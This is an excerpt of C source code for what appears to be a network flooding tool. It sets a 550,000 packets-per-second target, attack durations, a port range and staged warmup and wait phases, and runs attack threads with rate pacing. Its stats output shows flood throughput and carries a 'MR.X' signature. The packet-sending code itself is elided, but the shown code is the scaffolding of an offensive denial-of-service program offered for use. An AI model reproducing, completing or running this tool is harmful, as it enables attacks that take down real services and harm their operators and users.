...
#define MIN_ATTACK_TIME 20
#define MAX_ATTACK_TIME 60
#define TARGET_PPS 550000
#define PORT_RANGE 40000
#define BATCH_UPDATE 50000
#define PHASE_WARMUP 5
#define PHASE_WAIT1 3
#define PHASE_WARMUP2 5
#define PHASE_WAIT2 5
...
void *direct_attack(void *arg) {
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        long elapsed = (burst_end.tv_sec - burst_start.tv_sec) * 1000000 + 
                      (burst_end.tv_usec - burst_start.tv_usec);
        
        if (burst_packets > 0) {
            long target_us = (burst_packets * 1000000) / (TARGET_PPS / 2);
            if (elapsed < target_us && target_us - elapsed > 50) {
                usleep(target_us - elapsed);
            }
        }
...
void *attack_thread(void *arg) {
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (burst_packets > 0) {
            long target_us = (burst_packets * 1000000) / (TARGET_PPS / 3);
            if (elapsed < target_us && target_us - elapsed > 50) {
                usleep(target_us - elapsed);
            }
        }
        
        if (local_packets >= 20000) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
...
void *phase_controller(void *arg) {
    ...
    printf("🎯 PHASE 3: 5s @ 100%%\n");
    atomic_store(&attack_phase, 3);
    sleep(PHASE_WARMUP2);
    
    printf("⏸️  PHASE 4: 5s Wait\n");
    atomic_store(&attack_phase, 4);
    sleep(PHASE_WAIT2);
    
    int main_attack = ATTACK_TIME - 18;
    if (main_attack < 10) main_attack = 10;
...
void *stats_monitor(void *arg) {
    ...
    while (elapsed <= ATTACK_TIME && !atomic_load(&stop_signal)) {
        ...
        if (elapsed == PHASE_WARMUP) current_phase = 2;
        else if (elapsed == PHASE_WARMUP + PHASE_WAIT1) current_phase = 3;
        else if (elapsed == PHASE_WARMUP + PHASE_WAIT1 + PHASE_WARMUP2) current_phase = 4;
        else if (elapsed == PHASE_WARMUP + PHASE_WAIT1 + PHASE_WARMUP2 + PHASE_WAIT2) current_phase = 5;
        ...
        } else if (current_phase == 2 || current_phase == 4) {
            printf("⏸️  (Wait  🙏 MR.X)\n");
        } else {
            printf("💀 PPS: %lluK | Peak: %lluK | %.1fMB\n", pps/1000, atomic_load(&peak_pps)/1000, megabytes);
        }
